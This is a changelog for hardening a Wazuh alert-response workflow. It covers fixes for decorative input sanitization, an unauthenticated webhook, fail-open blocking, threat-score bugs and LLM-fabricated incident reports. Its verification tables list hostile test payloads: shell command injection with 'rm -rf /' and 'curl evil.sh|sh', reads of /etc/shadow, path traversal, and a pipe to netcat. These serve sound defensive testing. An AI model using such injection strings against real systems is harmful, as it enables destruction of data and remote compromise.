# Changelog — the 16 fixes

Every defect found while hardening this workflow, what it broke, and how the fix was verified.

**Ten were found by reading the workflow. Five bugs were found only by running it** — and every one of those five failed *silently*. Wrong numbers, a missing report, or a report about nothing. Never a crash. The pipeline reported success the entire time.

One entry is a **retraction**: a "fix" I diagnosed wrongly and would have broken working code. It's kept in, because a changelog that only lists successes isn't a changelog.

---

## Found by reading the workflow

### 1 · Input sanitization was decorative
The sanitization node validated the source IP and stripped shell metacharacters into `_sanitized`, and **nothing downstream ever read it.** All three command builders (Linux/Windows/macOS) used the raw alert field, which was then interpolated into bash and PowerShell executed over SSH on sudo-capable hosts.

The workflow *documented* injection protection it did not have.

**Fixed:** builders now read `_sanitized.srcip` (only when `srcip_valid`) and `_sanitized.location`, with a belt-and-braces charset guard. `grep` became `grep -F --` so an IP can never be interpreted as a regex.

### 1b · The sanitized values were being thrown away
Applying Fix 1 alone would have silently disabled IP filtering entirely. `Detect OS Name` and `Normalize Alert Data1` rebuild the item from scratch and were **dropping `_sanitized` and `config`** — so the command builders would have read `undefined` and filtered on nothing.

Caught by executing the chain rather than reading it.

**Fixed:** both nodes pass `_sanitized` and `config` through.

### 3 · Blocking depended on the threat-intel response, and failed open
The UFW block and the whitelist check both took the target IP from the VirusTotal response. If VirusTotal rate-limited or timed out, the block command became `sudo ufw deny from ` with an empty address, and the whitelist could not evaluate. Worse, the whitelist defaulted `block_enabled` to **true** when config was unreachable — the opposite of the configured default.

**Fixed:** both read the sanitized IP. Whitelist now fails safe (`false`). A rule-level gate was added as defence in depth. Blocking is skipped entirely on an unusable IP.

### 4 · The configuration node advertised settings it never applied
`MAX_LOG_LINES` was documented as the log-pull depth and wired to nothing — every `tail -n` and `-MaxEvents` count was hardcoded.

**Fixed:** wired through every log-retrieval command.

### 5 · The CVE parser threw on any missing field
The vulnerability branch accessed deeply nested paths with no null safety. One absent field sent the whole alert to the error handler instead of producing a degraded report.

**Fixed:** fully null-safe with sensible defaults.

### 6 · The IP allowlist was IPv4-only
CIDR matching split on `.`, so any IPv6 source produced garbage and silently failed to match the RFC1918 allowlist.

**Fixed:** rewritten with BigInt. IPv6 supported, address families never compared across, `::1` / `fe80::/10` / `fc00::/7` added to defaults.

### 7c · A crafted alert could read an arbitrary file
The Wazuh `location` field is attacker-influencable on some decoders and was passed straight into `tail`. A crafted alert could have produced `tail "/etc/shadow"`.

**Fixed:** constrained to an allowlist of log directories. No traversal, no spaces, strict charset.

### 8 · `actions_taken` was hardcoded empty
The field was literally `[]`. Nothing ever recorded that an IP was blocked, a log pull failed, or a response was skipped — so the dashboard's auto-block metric would have read zero forever, and no incident carried any record of what actually happened to it.

**Fixed:** a real timeline — `ufw_block`, `block_skipped_whitelisted / disabled / no_ip / threshold`, `logs_retrieved`, `threat_intel_enriched`, `deduplicated`, `ai_report_generated` — each with target, result, detail and timestamp. This is what the dashboard's pipeline trace is built from.

### 8b · `logs_retrieved` reported false successes
Any non-empty stdout counted as success — including a 34-character SSH error string, which showed as a green "logs retrieved" in the trace.

**Fixed:** requires meaningful length **and** no error signature (`timed out`, `connection refused`, `permission denied`, `handshake`), otherwise logs as failed with the reason.

### 9 · The alert webhook had no authentication
Anyone who learned the URL could POST a fabricated Wazuh alert — which makes the workflow SSH into hosts and potentially firewall-block an IP of their choosing. A remote trigger for privileged actions.

**Fixed:** header-based authentication.

### 10 · No retry or error handling on 19 network-dependent nodes
A single SSH timeout or a VirusTotal 429 (free tier: 4 requests/minute) aborted the entire execution and the alert was lost.

**Fixed:** retry and continue-on-error across 22 nodes. SSH: 2 tries then continue with an empty result. Threat intel: 3 tries with 5-second backoff. Delivery: 3 tries each, independent.

### 10b · A crashed run suppressed its own alert
Deduplication registered an alert *before* the pipeline ran. If the run then failed, that alert was suppressed for the full window and lost entirely.

**Fixed:** reserve-then-commit. Reservations expire in two minutes; only a run that produced a report commits.

---

## Found only by running it

Five bugs invisible to static review, plus one addition (15) that only became obvious once real reports existed.

### 11 · The threat score excluded VirusTotal entirely
Both threat-intel nodes connect to the *same input* of the scoring node, so the node only ever saw one of them. **VirusTotal contributed zero to every score the system had ever produced.**

Caught on the first live run: VirusTotal reported 16 malicious detections and AbuseIPDB 81% confidence, and the incident logged as **40.5 MEDIUM** — exactly AbuseIPDB's contribution alone. The correct score was **90.5 CRITICAL**.

Auto-block gating had been running on understated scores the entire time.

**Fixed:** each source is resolved directly rather than relying on input ordering, and the node now emits which sources it found so it can never fail silently again.

### 12 · The correct score was computed, then discarded
Same root cause, one layer down. Because both sources feed one input, the scoring node **executes twice** — once with full data, once partial. The consumer took whichever arrived.

Live proof: the scoring node output `50 / HIGH` while the row written to the database said `0 / LOW` — **in the same execution.**

**Fixed:** all executions are collected, scored by completeness, and the best is used. If every one is partial, the score is rebuilt from the raw intel nodes.

### 13 · Reports failed on every Windows and macOS alert
The incident report prompt referenced a node that only runs on the Linux branch — **12 times**. The case-management node did the same 6 times, the log parser once.

Windows, macOS and vulnerability alerts hit *"node hasn't been executed"* and produced no report at all. The documented multi-OS support was real for log **collection** and had never worked for report **generation**.

**Fixed:** all 19 references repointed to a node that runs before the OS switch.

### 14 · The model invented the attack type
Given a crypto-miner file detection and a Windows valid-account logon, `llama3.1:8b` described **both** as "SSH brute force" — and fabricated MITRE IDs, including `T1208`, which is not a real technique. The rule description and MITRE data were *in* the prompt and being ignored.

**Fixed:** the Wazuh rule description was promoted to explicit ground truth, an anti-default rule added with per-alert-type branches, MITRE locked to supplied values only, threat-intel numbers marked do-not-invent, and the model barred from overriding the computed threat level.

Result on the same alerts: correct threat type, correct MITRE (`T1078`), accurate intel figures, zero fabrication. The model was adequate — the prompt was the problem.

### 15 · Added: a machine-readable verdict
The report was prose. A dashboard cannot filter on prose.

The prompt now appends a structured verdict block, parsed into `ai_verdict`, `ai_confidence`, `ai_severity`, `ai_mitre` and `ai_recommended_action`. The computed threat level overrides the model's severity when they disagree. The block is stripped from the readable report so notifications stay clean.

This is what turns "the AI summarises" into "the AI decides, and a human confirms".

---

### 16 · Any JSON produced a confident incident report

The webhook accepted **any** body. A one-line health-check payload — `{"test":"ping"}` —
ran the full pipeline and produced a complete incident report:

```
THREAT TYPE:
The Wazuh rule detected an unknown OS, which may indicate a malware
infection or other security threat.

Agent Name: [unknown]    OS: unknown
Rule ID:    [unknown]    Source IP: none
```

Nothing was detected. "Unknown OS" was the OS-classifier finding no data, and the
model turned that absence into a malware narrative and recommended a full scan.

Two problems in one: an authenticated-but-malformed POST could **manufacture fake
incidents**, and the model treated missing data as evidence rather than as missing.

**Fixed:** both normalization nodes verify the payload carries `rule.id`, `rule.level`
and `agent.name` before anything else runs. Anything else is rejected at the first
node with a message naming what was missing and what keys arrived.

Verified: ping payload, empty body and arbitrary JSON all rejected; both real Wazuh
formats (raw alert and `full_alert` wrapper) still accepted.

Found the same way as 11–14 — by firing something real at it. In this case the
"something real" was a health check.

## Retracted

### 2 · ~~VirusTotal array indexing~~ — wrong diagnosis, not applied

I flagged `last_analysis_stats[0]` as indexing an object with an array subscript and silently zeroing the VirusTotal counts.

It isn't. Tracing the connections shows an aggregation node converts the stats into an array before they reach those consumers, while a different branch reads the raw object directly. Two shapes, two paths, no bug.

Applying the "fix" would have replaced working values with `undefined`.

Left in this changelog deliberately. Pattern-matching on `[0]` without tracing the data flow is exactly the kind of confident wrong answer worth recording.

---

## How the fixes were verified

Every JavaScript node was syntax-checked, then the sanitization chain was **executed** against crafted payloads rather than reviewed:

| Payload | Result |
|---|---|
| `srcip: "1.2.3.4; rm -rf / #"` | blocked — invalid IP, dropped |
| `srcip: "$(curl evil.sh\|sh)"` | blocked |
| `location: "/etc/shadow"` | blocked — not an allowlisted log path |
| `location: "/var/log/../../etc/shadow"` | blocked — traversal |
| `location: "/var/log/auth.log \| nc evil 1234"` | blocked — charset |

**5/5 blocked.** All three sample alerts still route correctly and produce full reports.

The payload guard (16) was verified the same way — by execution, not review:

| Payload | Result |
|---|---|
| `{"test":"ping"}` | rejected — missing `rule.id`, `rule.level`, `agent.name` |
| `{}` | rejected |
| arbitrary JSON | rejected |
| real Wazuh alert | accepted, full pipeline |
| `full_alert` wrapper | accepted, full pipeline |

The end-to-end pipeline was then validated on real hardware: alert → authenticated webhook → sanitization → deduplication → dual threat intel → local LLM → parsed verdict → Postgres. Every stage confirmed against stored data, not assumed.

---

## The lesson

The five most serious defects were all **silent**. Nothing crashed. The workflow reported success while producing a threat score that ignored half its intelligence sources, no report at all on two of three operating systems, an AI verdict describing an attack that never happened — and, when handed a health-check ping, a complete incident report about a threat that did not exist.

That last one is the one worth sitting with. The pipeline did not fail on empty input. It filled the gap.

A test harness and real alerts found them. Reading the code did not.
